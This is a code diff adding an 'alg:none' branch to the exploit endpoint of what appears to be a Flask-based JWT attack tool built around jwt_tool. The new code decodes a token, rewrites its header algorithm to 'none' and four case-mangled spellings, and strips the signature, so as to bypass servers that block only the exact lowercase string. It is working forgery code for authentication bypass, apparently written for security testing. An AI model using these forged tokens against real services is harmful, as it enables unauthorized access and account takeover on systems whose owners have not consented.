@@ -594,6 +594,41 @@ def exploit():
 
         output = f"{note}\n\nNew JWT:\n\n{new_token}"
         return jsonify({"output": output})
+    elif code == "a":
+        # alg:none, built natively (not delegated to jwt_tool) so we can
+        # return several differently-cased spellings at once. Some servers
+        # block the exact lowercase string "none" but still accept a
+        # case-mangled version of it, since the JWT spec never says the
+        # comparison has to be case-sensitive and not every implementation
+        # bothers to lowercase first.
+        parts = token.split(".")
+        if len(parts) < 2:
+            return jsonify({"error": "That does not look like a JWT"}), 400
+        try:
+            header = json.loads(b64url_decode(parts[0]))
+            payload = json.loads(b64url_decode(parts[1]))
+        except Exception as exc:
+            return jsonify({"error": f"Could not decode token: {exc}"}), 400
+        if not isinstance(header, dict) or not isinstance(payload, dict):
+            return jsonify({"error": "Token header/payload must be JSON objects"}), 400
+
+        variants = ["none", "None", "NONE", "nOnE", "noNe"]
+        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
+        tokens = []
+        for variant in variants:
+            variant_header = dict(header)
+            variant_header["alg"] = variant
+            header_b64 = b64url_encode(json.dumps(variant_header, separators=(",", ":")).encode())
+            tokens.append({"label": variant, "token": f"{header_b64}.{payload_b64}."})
+
+        output = (
+            "Re-signed with alg set to \"none\", plus 4 differently-cased spellings "
+            "of it, with the signature removed entirely. Some servers only block the "
+            "exact lowercase string and accept one of the others. For a custom "
+            "combination of your own, use Forge instead.\n\n"
+            + "\n\n".join(f"{t['label']}:\n{t['token']}" for t in tokens)
+        )
+        return jsonify({"output": output, "tokens": tokens})
 
     try:
         output = run_jwt_tool(args)
